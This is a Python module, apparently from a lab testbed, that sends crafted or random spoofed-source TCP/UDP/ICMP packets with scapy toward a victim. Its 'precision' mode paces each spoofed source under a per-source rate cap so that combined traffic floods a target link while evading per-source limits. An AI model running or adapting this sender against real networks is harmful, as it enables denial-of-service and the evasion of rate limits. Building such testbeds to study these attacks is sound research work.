"""AC-3/AC-4 traffic sender: emits crafted (or random-blind) `FiveTuple`s as
real packets toward the victim.

The only attacker file needing scapy + root/netns -- packet crafting stays
out of `collision.py` so the rest of the attacker runs anywhere.
"""
from __future__ import annotations

import random
import time
from typing import Literal

from testbed.types import FiveTuple

TrafficMode = Literal["volumetric", "precision"]


def random_five_tuples(count: int, *, dst_ip: str, proto: int = 6) -> list[FiveTuple]:
    """Blind fallback (AC-2): uncrafted 5-tuples that spread ~uniformly
    across links -- the expected-failure baseline."""
    return [
        FiveTuple(
            src_ip=f"10.0.0.{random.randint(100, 250)}",
            dst_ip=dst_ip,
            src_port=random.randint(1024, 65535),
            dst_port=random.randint(1, 65535),
            proto=proto,
        )
        for _ in range(count)
    ]


def send_flows(
    five_tuples: list[FiveTuple],
    *,
    mode: TrafficMode,
    rate_pps: int,
    per_source_cap: int,
    iface: str,
) -> int:
    """Send `five_tuples` as real packets toward the victim; returns the
    packet count sent.

    - **volumetric** (AC-3) -- sends every tuple in order at `rate_pps`, no
      per-source pacing. Callers pass a single fixed tuple repeated `count`
      times for the naive, no-variation control.
    - **precision** (AC-4) -- paces sends per `src_ip` so no single spoofed
      source exceeds `per_source_cap` pps; the aggregate lands on the
      target link while every individual source stays compliant.
    """
    if not five_tuples:
        return 0
    if mode == "volumetric":
        return _send_volumetric(five_tuples, rate_pps=rate_pps, iface=iface)
    if mode == "precision":
        return _send_precision(five_tuples, per_source_cap=per_source_cap, iface=iface)
    raise ValueError(f"unknown traffic mode: {mode!r}")


def _build_packet(five_tuple: FiveTuple):
    from scapy.all import ICMP, IP, TCP, UDP

    ip_layer = IP(src=five_tuple.src_ip, dst=five_tuple.dst_ip)
    if five_tuple.proto == 6:
        return ip_layer / TCP(sport=five_tuple.src_port, dport=five_tuple.dst_port)
    if five_tuple.proto == 17:
        return ip_layer / UDP(sport=five_tuple.src_port, dport=five_tuple.dst_port)
    return ip_layer / ICMP()


def _send_volumetric(five_tuples: list[FiveTuple], *, rate_pps: int, iface: str) -> int:
    from scapy.all import send

    delay = 1.0 / rate_pps if rate_pps > 0 else 0.0
    sent = 0
    for five_tuple in five_tuples:
        send(_build_packet(five_tuple), iface=iface, verbose=False)
        sent += 1
        if delay:
            time.sleep(delay)
    return sent


def _send_precision(five_tuples: list[FiveTuple], *, per_source_cap: int, iface: str) -> int:
    from scapy.all import send

    min_interval = 1.0 / per_source_cap if per_source_cap > 0 else 0.0
    last_sent_at: dict[str, float] = {}
    sent = 0
    for five_tuple in five_tuples:
        previous = last_sent_at.get(five_tuple.src_ip)
        if previous is not None and min_interval:
            wait = min_interval - (time.perf_counter() - previous)
            if wait > 0:
                time.sleep(wait)
        send(_build_packet(five_tuple), iface=iface, verbose=False)
        last_sent_at[five_tuple.src_ip] = time.perf_counter()
        sent += 1
    return sent
